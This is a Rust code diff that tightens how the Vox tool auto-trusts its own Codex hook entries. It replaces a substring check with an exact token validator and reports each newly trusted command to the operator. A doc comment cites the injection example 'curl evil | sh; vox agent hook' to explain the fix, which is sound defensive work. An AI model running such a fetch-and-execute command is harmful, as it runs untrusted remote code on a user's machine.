@@ -15,9 +15,13 @@
 //! the entry's command changes. A trusted entry whose command then changes lists as
 //! `modified` — neither `trusted` nor `untrusted` — so anything but `trusted` is re-granted.
 //!
-//! **Only Vox's own entries** — commands running `vox agent hook` — are trusted. Another
-//! tool's hook is that tool's decision, and trusting it here would be granting an
-//! authority nobody asked for.
+//! **Only Vox's own entries are trusted, and "own" is exact.** A command qualifies only
+//! if it is, token for token, what `vox agent plugin codex` emits — `vox agent hook`,
+//! optionally with `vox agent hook`'s own flags and values of plain characters — with no
+//! shell metacharacter anywhere ([`is_vox_hook`]). Codex runs a hook's command through a
+//! shell, so a substring match would trust `curl evil | sh; vox agent hook`: trusting a
+//! command is authorising it to run on every turn. Another tool's hook is that tool's
+//! decision, and a `modified` entry whose command is no longer Vox's is not re-trusted.
 
 use std::io::{BufRead as _, BufReader, Write as _};
 use std::process::{Child, ChildStdin, Command, Stdio};
@@ -36,6 +40,9 @@ pub struct Report {
     pub found: usize,
     /// Of those, how many were untrusted and are now trusted.
     pub trusted_now: usize,
+    /// Each entry newly trusted: `(key, command)`, so the operator sees exactly what
+    /// was authorised to run.
+    pub entries: Vec<(String, String)>,
 }
 
 struct AppServer {
@@ -117,9 +124,39 @@ impl Drop for AppServer {
     }
 }
 
-/// Vox's hook entries in a `hooks/list` result: `(key, currentHash, trusted)`, once each.
-fn ours(listed: &Value) -> Vec<(String, String, bool)> {
-    let mut out: Vec<(String, String, bool)> = Vec::new();
+/// Whether `command` is exactly Vox's drain hook: `vox` (or an absolute path to a file
+/// named `vox`), then `agent hook`, then only `vox agent hook`'s own flags, each with a
+/// value of plain characters — and nothing a shell would interpret.
+#[must_use]
+pub fn is_vox_hook(command: &str) -> bool {
+    let plain = |v: &str, extra: &[char]| {
+        !v.is_empty()
+            && v.len() <= 256
+            && v.chars().all(|c| {
+                c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') || extra.contains(&c)
+            })
+    };
+    let tokens: Vec<&str> = command.split(' ').collect();
+    let [exe, "agent", "hook", flags @ ..] = tokens.as_slice() else {
+        return false;
+    };
+    let exe_ok =
+        *exe == "vox" || (exe.starts_with('/') && exe.ends_with("/vox") && plain(exe, &['/']));
+    if !exe_ok || flags.len() % 2 != 0 {
+        return false;
+    }
+    flags.chunks(2).all(|pair| match pair {
+        ["--room" | "--session" | "--profile", v] => plain(v, &[]),
+        ["--format", v] => matches!(*v, "auto" | "claude" | "text"),
+        ["--data-dir" | "--config-dir", v] => v.starts_with('/') && plain(v, &['/']),
+        _ => false,
+    })
+}
+
+/// Vox's hook entries in a `hooks/list` result: `(key, currentHash, trusted, command)`,
+/// once each.
+fn ours(listed: &Value) -> Vec<(String, String, bool, String)> {
+    let mut out: Vec<(String, String, bool, String)> = Vec::new();
     for h in listed["data"]
         .as_array()
         .into_iter()
@@ -127,19 +164,20 @@ fn ours(listed: &Value) -> Vec<(String, String, bool)> {
         .flat_map(|d| d["hooks"].as_array().into_iter().flatten())
     {
         let command = h["command"].as_str().unwrap_or_default();
-        if !command.contains("vox agent hook") {
+        if !is_vox_hook(command) {
             continue;
         }
         let (Some(key), Some(hash)) = (h["key"].as_str(), h["currentHash"].as_str()) else {
             continue;
         };
-        if out.iter().any(|(k, _, _)| k == key) {
+        if out.iter().any(|(k, _, _, _)| k == key) {
             continue; // the same hook is reported once per cwd
         }
         out.push((
             key.to_owned(),
             hash.to_owned(),
             h["trustStatus"].as_str() == Some("trusted"),
+            command.to_owned(),
         ));
     }
     out
@@ -161,8 +199,8 @@ pub fn trust(codex: &str) -> Result<Report, String> {
     let listed = ours(&app.call("hooks/list", json!({}))?);
     let edits: Vec<Value> = listed
         .iter()
-        .filter(|(_, _, trusted)| !trusted)
-        .map(|(key, hash, _)| {
+        .filter(|(_, _, trusted, _)| !trusted)
+        .map(|(key, hash, _, _)| {
             json!({
                 // A dotted TOML path whose middle segment is a quoted key: it holds `/`,
                 // `.` and `:`, so it is serialised as a JSON string.
@@ -175,13 +213,18 @@ pub fn trust(codex: &str) -> Result<Report, String> {
     let report = Report {
         found: listed.len(),
         trusted_now: edits.len(),
+        entries: listed
+            .iter()
+            .filter(|(_, _, trusted, _)| !trusted)
+            .map(|(k, _, _, c)| (k.clone(), c.clone()))
+            .collect(),
     };
     if edits.is_empty() {
         return Ok(report);
     }
     app.call("config/batchWrite", json!({ "edits": edits }))?;
     let after = ours(&app.call("hooks/list", json!({}))?);
-    if let Some((key, _, _)) = after.iter().find(|(_, _, trusted)| !trusted) {
+    if let Some((key, _, _, _)) = after.iter().find(|(_, _, trusted, _)| !trusted) {
         return Err(format!(
             "Codex still reports {key} as untrusted after the write"
         ));
